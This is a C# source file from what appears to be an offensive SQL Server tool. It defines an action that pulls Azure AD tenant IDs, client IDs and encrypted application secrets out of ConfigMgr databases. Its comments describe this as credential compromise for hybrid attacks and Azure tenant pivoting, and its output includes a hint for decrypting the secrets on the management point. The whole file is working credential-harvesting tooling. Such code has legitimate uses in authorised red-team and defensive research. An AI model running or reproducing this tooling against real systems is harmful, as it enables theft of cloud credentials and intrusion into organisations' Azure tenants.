using MSSQLand.Services;
using MSSQLand.Utilities;
using MSSQLand.Utilities.Formatters;
using System;
using System.Data;

namespace MSSQLand.Actions.CM
{
    /// <summary>
    /// Enumerate Azure AD application registrations stored in ConfigMgr for cloud management gateway and co-management.
    /// Use this to identify Azure AD tenants, application IDs, and encrypted secrets used for hybrid configurations.
    /// Shows AAD tenant IDs, application (client) IDs, application names, and encrypted secret key blobs.
    /// Secrets can be decrypted on the management point using DPAPI.
    /// Compromising these credentials grants access to cloud-based ConfigMgr infrastructure and Azure resources.
    /// Critical for hybrid environment attacks and Azure tenant pivoting.
    /// </summary>
    internal class CMAadApps : BaseAction
    {
        [ArgumentMetadata(Position = 0, ShortName = "f", LongName = "filter", Description = "Filter by application name")]
        private string _filter = "";

        public override void ValidateArguments(string[] args)
        {
            var (named, positional) = ParseActionArguments(args);

            _filter = GetNamedArgument(named, "f", null)
                   ?? GetNamedArgument(named, "filter", null)
                   ?? GetPositionalArgument(positional, 0, "");
        }

        public override object? Execute(DatabaseContext databaseContext)
        {
            string filterMsg = !string.IsNullOrEmpty(_filter) ? $" (filter: {_filter})" : "";
            Logger.TaskNested($"Enumerating Azure AD applications{filterMsg}");

            CMService sccmService = new(databaseContext.QueryService, databaseContext.Server);

            var databases = sccmService.GetSccmDatabases();

            if (databases.Count == 0)
            {
                Logger.Warning("No ConfigMgr databases found with Azure AD configuration");
                return null;
            }

            foreach (string db in databases)
            {
                Logger.NewLine();
                string siteCode = CMService.GetSiteCode(db);
                Logger.Info($"ConfigMgr database: {db} (Site Code: {siteCode})");

                try
                {
                    // First check if tables exist and have data
                    string checkQuery = $@"
SELECT 
    (SELECT COUNT(*) FROM [{db}].dbo.AAD_Application_Ex) AS AppCount,
    (SELECT COUNT(*) FROM [{db}].dbo.AAD_Tenant_Ex) AS TenantCount";

                    DataTable checkResult = databaseContext.QueryService.ExecuteTable(checkQuery);
                    int appCount = Convert.ToInt32(checkResult.Rows[0]["AppCount"]);
                    int tenantCount = Convert.ToInt32(checkResult.Rows[0]["TenantCount"]);

                    Logger.InfoNested($"AAD_Application_Ex: {appCount} row(s)");
                    Logger.InfoNested($"AAD_Tenant_Ex: {tenantCount} row(s)");

                    if (appCount == 0)
                    {
                        Logger.NewLine();
                        Logger.Warning("No Azure AD applications configured in ConfigMgr");
                        continue;
                    }

                    string whereClause = "";
                    if (!string.IsNullOrEmpty(_filter))
                    {
                        whereClause = $"WHERE a.Name LIKE '%{_filter.Replace("'", "''")}%'";
                    }

                    string query = $@"
SELECT 
    a.ID,
    t.TenantID,
    t.Name AS TenantName,
    a.ClientID,
    a.Name AS ApplicationName,
    a.LastUpdateTime,
    CONVERT(VARCHAR(MAX), a.SecretKey, 1) AS SecretKey,
    CONVERT(VARCHAR(MAX), a.SecretKeyForSCP, 1) AS SecretKeyForSCP
FROM [{db}].dbo.AAD_Application_Ex a
LEFT JOIN [{db}].dbo.AAD_Tenant_Ex t ON t.ID = a.TenantDB_ID
{whereClause}
ORDER BY a.LastUpdateTime DESC";

                    DataTable appsTable = databaseContext.QueryService.ExecuteTable(query);

                    if (appsTable.Rows.Count == 0)
                    {
                        Logger.NewLine();
                        Logger.Warning("No Azure AD applications found");
                        continue;
                    }

                    Logger.Success($"Found {appsTable.Rows.Count} Azure AD application(s)");
                    Logger.NewLine();

                    Console.WriteLine(OutputFormatter.ConvertDataTable(appsTable));

                    // Show decryption hint if secrets found
                    bool hasSecrets = false;
                    foreach (DataRow row in appsTable.Rows)
                    {
                        string secretKey = row["SecretKey"]?.ToString() ?? "";
                        string secretKeyForSCP = row["SecretKeyForSCP"]?.ToString() ?? "";
                        
                        if (!string.IsNullOrEmpty(secretKey) || !string.IsNullOrEmpty(secretKeyForSCP))
                        {
                            hasSecrets = true;
                            break;
                        }
                    }

                    if (hasSecrets)
                    {
                        Logger.NewLine();
                        Logger.InfoNested("Encrypted secrets found. Decrypt on Management Point with");
                        Logger.InfoNested("sccm-script-run --resourceid <MP_ID> --scriptguid <decrypt_script>");
                    }
                }
                catch (Exception ex)
                {
                    Logger.Error($"Failed to enumerate Azure AD applications: {ex.Message}");
                }
            }

            return null;
        }
    }
}
